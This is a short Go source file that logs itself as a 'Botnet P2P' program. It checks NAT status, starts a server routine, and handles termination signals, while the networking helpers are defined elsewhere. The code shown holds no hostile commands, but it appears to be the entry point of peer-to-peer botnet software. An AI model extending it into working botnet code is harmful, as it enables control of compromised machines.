package main

import (
	"os"
	"os/signal"
	"log"
	"syscall"
)

func main() {
	log.Println("Botnet P2P booting...")
	nat, _ := checkNAT()
	terminate := make(chan struct{})
	log.Printf("NAT: %t\n", nat)
	go exitHandler(terminate)
	serverRoutine(defaultPort, terminate)
}

func exitHandler(term chan struct{}) {
	signalChannel := make(chan os.Signal, 3)
	signal.Notify(signalChannel, os.Interrupt, syscall.SIGINT, syscall.SIGTERM)
	<-signalChannel
	close(term)
	log.Println("Terminate signal received!")
	//os.Exit(0)
}